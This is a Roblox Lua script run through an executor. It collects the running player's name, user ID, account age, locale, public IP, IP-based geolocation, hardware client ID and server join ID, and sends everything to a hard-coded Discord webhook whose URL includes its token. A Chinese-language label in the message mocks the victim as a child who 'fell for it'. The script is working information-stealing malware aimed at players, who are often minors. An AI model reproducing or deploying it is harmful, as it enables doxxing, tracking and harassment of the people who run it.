local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

-- Player Info
local LocalPlayer = Players.LocalPlayer
local Userid = LocalPlayer.UserId
local DName = LocalPlayer.DisplayName
local Name = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = game.LocalizationService.RobloxLocaleId
local GetIp = game:HttpGet("https://v4.ident.me/")
local GetData = game:HttpGet("http://ip-api.com/json")
local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'

-- Game Info
local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name

-- Detecting Executor
local function detectExecutor()
    return identifyexecutor() -- 直接返回执行器识别结果
end

-- Creating Webhook Data
local function createWebhookData()
    local webhookcheck = detectExecutor()
    
    local data = {
        ["avatar_url"] = "https://youke1.picui.cn/s1/2025/07/21/687e0e218c997.png",
        ["content"] = "",
        ["embeds"] = {
            {
                ["author"] = {
                    ["name"] = "有小屁孩上当了信息是：",
                    ["url"] = "https://roblox.com",
                },
                ["description"] = string.format(
                    "__[玩家信息](https://www.roblox.com/users/%d)__" ..
                    " **\n显示名称:** %s \n**名字:** %s \n**玩家id:** %d\n**会员类型:** %s" ..
                    "\n**年龄:** %d\n**国家:** %s**\nIP:** %s**\nHwid:** %s**\n日期:** %s**\n时间:** %s" ..
                    "\n\n__[游戏信息](https://www.roblox.com/games/%d)__" ..
                    "\n**游戏:** %s \n**游戏id**: %d \n**注入器:** %s" ..
                    "\n\n**数据:**```%s```\n\n**JobId:**```%s```",
                    Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
                    tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
                    game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
                    GetData, ConsoleJobId
                ),
                ["type"] = "rich",
                ["color"] = tonumber("0xFFD700"), -- Change the color if you want
                ["thumbnail"] = {
                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"
                },
            }
        }
    }
    return HttpService:JSONEncode(data)
end

-- Sending Webhook
local function sendWebhook(webhookUrl, data)
    local headers = {
        ["content-type"] = "application/json"
    }

    local request = http_request or request or HttpPost or syn.request
    local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
    request(abcdef)
end

-- Replace the webhook URL with your own URL
local webhookUrl = "https://discord.com/api/webhooks/1394930330858688512/QHHbHa2CzBecv1_xkJTtKE6Qc9DzVDhHdlq1tZJw3WbVDwhZ1-J33gmoaMRrTW7nZXnA"
local webhookData = createWebhookData()

-- Sending the webhook
sendWebhook(webhookUrl, webhookData)
